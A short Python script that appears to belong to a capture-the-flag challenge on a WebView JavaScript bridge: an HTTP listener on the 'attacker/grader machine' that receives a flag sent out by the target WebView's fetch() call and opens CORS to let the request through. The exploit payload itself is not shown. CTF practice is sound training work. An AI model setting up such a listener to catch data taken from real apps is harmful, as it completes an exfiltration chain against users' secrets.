#!/usr/bin/env python3
"""
Minimal exfil listener for the WebView JS-bridge CTF challenge.

Run on the attacker/grader machine:
    python3 listener.py

Then trigger the PoC per README.md step 3 (deep link or pushed
payload.html). The flag will print here as soon as the WebView's
fetch() call arrives.
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

PORT = 8000


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        flag = query.get("flag", [None])[0]
        if flag:
            print(f"[+] Received flag: {flag}")
        else:
            print(f"[!] Hit with no flag param: {self.path}")

        # Minimal CORS so the WebView's fetch() doesn't error out.
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        pass  # keep stdout clean; we print what matters above


if __name__ == "__main__":
    print(f"[*] Listening on 0.0.0.0:{PORT} ... waiting for flag")
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
